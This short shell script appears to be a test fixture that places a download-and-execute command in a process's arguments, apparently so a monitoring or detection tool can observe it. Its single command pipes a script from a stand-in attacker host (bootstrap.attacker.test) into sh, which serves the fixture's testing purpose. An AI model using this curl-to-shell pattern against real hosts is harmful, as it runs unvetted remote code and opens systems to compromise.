#!/bin/sh
# Keep the actual pipeline in a sampled shell's argv; do not fetch a live URL.
/bin/sh -c 'curl --max-time 2 -s http://bootstrap.attacker.test/install.sh | sh; sleep 1'
